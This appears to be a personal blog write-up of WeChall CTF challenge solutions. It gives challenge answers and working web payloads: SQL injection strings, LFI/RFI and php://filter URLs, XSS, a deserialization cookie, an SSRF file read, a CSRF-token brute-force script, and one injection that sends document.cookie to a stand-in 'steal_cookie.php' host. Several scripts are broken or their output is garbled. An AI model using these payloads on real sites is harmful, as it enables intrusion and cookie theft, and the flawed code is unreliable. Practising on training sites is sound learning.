# Get Sourced

Right click to inspect source; move to page button; and you will find html_sourcecode

# ASCII

Google ASCII Decoder, feel free to use one. Answer:mrnadgraoaae

# URL

Google URL Decoder, and solution is: `http://www.wechall.net/challenge/training/encodings/url/saw_lotion.php?p=lalmociaeeap&cid=52#password=fibre_optics`

# Stegano I

A simple misc, download the image and open it in UltraEdit. Answer: `steganoI`

# WWW-Robots

Here it is `http://www.wechall.net/challenge/training/www/robots/T0PS3CR3T`

# Caesar I

Write a script to crack it:
```python
cryptext = "IWT FJXRZ QGDLC UDM YJBEH DKTG IWT APON SDV DU RPTHPG PCS NDJG JCXFJT HDAJIXDC XH GBRWABWXXURX"
alphabet = []
for i in range(ord('a'), ord('z')+1):
    alphabet.insert(i-ord('a'), chr(i))
    
for i in range(1, 26):
    for w in alphabet:
        if(w != ' '):
            print(alphabet[(ord(s) + b - 1) % 26], end = '')
        else:
            print(' ', end='')
    
    print('\n')
```

and the answer is `rmchlmhiifci`

# PHP0817

Type conversion error. Every string is equal to 0. Just type solution

# Prime Factory

Emm..mathematics problem:
```python
num1 = 1000000
prime = 0
def isPrime(n):
    i = 5
    if (n <= 1):
        return False
    elif (n <= 3):
        return True
    elif (n % 2 == 0 or n % 3 == 0):
        return False
    while (i*i <= n):
        if (n % i == 0) or (n % (i + 2) == 0):
            return False
        i = i + 6
    return True
                                                                            
while (prime!=2):
    if(isPrime(num1)):
        tmp = num1
        num2 = 0
            while (tmp > 0):
                num2 = tmp % 10 + num2
                tmp = int(tmp / 10)
            if(isPrime(num2)):
                prime = prime + 1
                print("Answer:" + str(num1))
    num1 = num1 + 1
Answer is 10000331000037
```

# MYSQL I

SQL query without filtering, easy to crack:
```
Username: admin'--'
Password: Feel free to write
```

after entering, the query becomes `SELECT * FROM users WHERE username='admin'--' and password='abc123';` It’s obvious that we bypass password mechanism.

# Zebra

The Zebra is actually a bar code, but I am too lazy to ps it…

# Stegano Attachment

Change `.php` to `.rar`, and you will see *solution.txt* inside. Actually, you can also view in it hex mode and found the key.

# Transposition 1

hint: *Wonderful*. Script:
```python
ciphertext = "oWdnreuf.lY uoc nar ae dht eemssga eaw yebttrew eh nht eelttre sra enic roertco drre . Ihtni koy uowlu dilekt  oes eoyrup sawsro don:wl defcirbros.i"
decoded = ""
i = 0
while (i+1 < len(ciphertext)):
    decoded += ciphertext[i+1] + ciphertext[i]
        i += 2
        
        print(decoded)
```

# Chapter I (Warchall begins)

Login via ssh. The first three solutions are in `/home/level`.
Level 0: Merely requires `cat`.
Level 1: Go to the directory and use find `/home/level/1 | grep SOLUTION.txt` . Then cat it.
Level 2: Continue using find command…and you will find `.prob/solution`
Level 3: Emmm…no obvious file, use `la -la` and `cat` each hidden file
Level 4: `chmod` that file to add read permission
Level 5: `chmod o-rwx ~/level`, a solution.txt will appear later
final solution: bitwarrior,LameStartup,HiddenIsConfig,RepeatingHistory,AndIknowchown,OhRightThePerms

# hi

`(17591026060782+2)*17591026060781/2=154722098935564539692256152`

# Register Global

Classical PHP vulnerability:
```php
if (isset($login))
{
  ...
}
```

use this url

# Vote

I see the writeup…but sill confused

# PHP LFI

Use *%00* to eliminate `.html`, and add `../../` to traverse to upper directory: `http://www.wechall.net/challenge/training/php/lfi/up/index.php?file=../../solution.php%00`

> I decided to skip several boring question…

# Limited Access

Use post request to bypass it

# Limited Access Too

Ban so much options, but we still get **patch**

# PHP 0818

`hex(3735929054)==0xdeadc0de`

# Are you serial?

PHP deserialize bug. Feel free to fill a name, and change serial_user cookie to this:  `O%3A15%3A%22SERIAL_Solution%22%3A0%3A%7B%7D`

# HTMLSpecialChars

I think the answer is `' onclick='alert(1)` but my XSS filter blocks me, so I cannot verify my answer…

# Live RFI

Let’s visit `http://rfi.warchall.net/index.php?lang=solution.php` first.

And then, using php protocol to read file `http://rfi.warchall.net/index.php?lang=php://filter/read=convert.base64-encode/resource=solution.phpWe` add convert.base64-encode to make sure it’s escaped, other wise it will affect *index.php*

# Auth Me

Look at the url, find file in: `http://www.wechall.net/challenge/space/auth_me/find_me/`

# PHP 0816

Step error: `http://www.wechall.net/challenge/php0816/code.php?&hl[0]=vulnerable&mode=hl&src=solution.php`

# PHP 0815

Type convert: `(int)$show`

# Crappyshare

SSRF, we can use `file://soultuin.php` to get result

# Live LFI

Similar to Live RFI

# Quangcurrency

Concurrency issue, the add money button spends significantly more time. We can first click add money button and immediately click purchase button. Our spend money will be reset due to concurrency issue

# No Escape
Indeed no escape;
```
bill`=111;`george`=`george
```

# The Cookie is a lie

It always says I exceeded available chances for PM. I think the id is `1 and 2=1; insert into experience(id, filename) VALUES (233,'http://test.cake/steal_cookie.php?cookie=docuement.cookie'); select * from users where id=233`

# Yourself PHP

My answer should be correct… but I spend additional time to close a tag. Stupid check: `https://www.wechall.net/challenge/yourself_php/index.php/%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

# Stop up

key word: *ignore_user_abort*. When the purchase page shows purchasing, stops it. You balance won’t be reduced

# Brainfucked

Find a jsfuck decoder and you will get the content

# Regex Mini

Too lazy to read doc, use fuzz method. I don’t think it’s okay to insert chart inside the context. So I tested char at the beginning and the end. The answer is: `aaaaaaaaaaaa%0a`

# PHP 0819

I find HEREDOC to bypass it. But HEREDOC has so many bugs…`http://www.wechall.net/challenge/space/php0819/index.php?eval=%3C%3C%3CE%0a1337%0aE;%0a`

# MySql II

The page seems do not response, in theory: `username=jnllk' union select 1,'admin',md5('1'); -- &password=1`

# Tablename

Use Sqlmap or union injection

# MYSQL MD5
```sql
' union select password,1 from users limit 1;#
```

You need a hash cracker to exploit md5…and the result is a little bit tricky…

# Host Me

Well…I forgot to change GET from relative URL to absolute URL…wasted lots of time:
```http
GET http://www.wechall.net/challenge/space/host_me/index.php HTTP/1.1
Host: localhost
```

# Table Name II

```sql
' union select 1,2,info from information_schema.processlist-- -
```

# Time to Reset

I didn’t came up with this quest, so I refer `http://rk700.github.io/2014/06/18/time-to-reset/`. We can brute-force through CSRF token. First get time() from Live RFI, then:
```php
<?php
function ttr_random($len, $alpha='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')
{
        $alphalen = strlen($alpha) - 1;
        $key = '';
        for($i = 0; $i < $len; $i++){
            $key .= $alpha[rand(0, $alphalen)];
        }
        return $key;
}
$time=1403111639;
for($i=0; $i<255; $i++) {
        srand($time+$i);
        $csrf=ttr_random(32);
        $real='BLQChCcpFPZoACf9VpoeKEes4k2BpeDR';
        if($csrf === $real) {
            echo ttr_random(16).PHP_EOL;
        }
}
?>
```

# Addslash

GBK injection, and we need union select to return new query: 
```
?username=Admin%df%27%20and%201=2%20union%20select%20concat(CHAR(65),CHAR(100),CHAR(109),CHAR(105),CHAR(110));%23&password=123&login=%E6%B3%A8%E5%86%8C
```